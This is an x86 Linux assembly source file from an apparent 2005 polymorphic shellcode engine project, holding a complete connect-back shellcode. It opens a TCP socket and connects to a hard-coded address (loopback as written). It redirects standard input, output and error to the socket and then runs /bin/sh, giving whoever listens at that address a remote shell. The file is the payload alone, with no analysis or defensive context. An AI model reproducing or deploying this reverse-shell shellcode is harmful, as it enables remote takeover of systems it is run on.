;
; connect.asm for Polymorphic Shellcode Engine project
;
; Made by eee
;
; Started on  Thu Apr 14 00:29:44 2005 eee
; Last update Sat Apr 16 15:17:40 2005 eee
;	

BITS 32

;_start:
        xor     eax, eax
        cdq
        mov      al, 102                ; socket
        xor     ebx, ebx
        push    ebx                     ; IPPROTO_TCP (0)
        inc     ebx                     ; 1 -> socket
        push    ebx                     ; SOCKET_STREAM == 1
        inc 	ebx
	push    ebx                     ; AF_INET = 2
	dec	ebx
        mov     ecx, esp
        int     0x80

;connect:
        push    0x0100007F              ; ip adresss
        push    word 0xB315
	inc	edx
	inc	edx
	push	word dx
	xor	edx, edx
        mov     esi, esp
        mov	dl, 16                      ; bytes long adress
	push	edx
        push    esi                     ; sockaddr_in struc
        push    eax                     ; fd
        mov	 al, 102
        inc     ebx
        inc     ebx                     ; 3 -> connect
        mov     ecx, esp
        int     0x80

;dup2:
	xor 	ecx, ecx
	mov	 cl, 3
	pop	ebx			; fd
boucle:
	dec	ecx
	mov	al, 63
	int	0x80
	jg	boucle


;execve	/bin /sh
     	xor	edx, edx
	mov     al, 11			;execve
        push	edx
	push    "//sh"
        push    "/bin"
        mov     ebx, esp
        push    ecx
        push    ebx
        mov     ecx, esp
        int     0x80




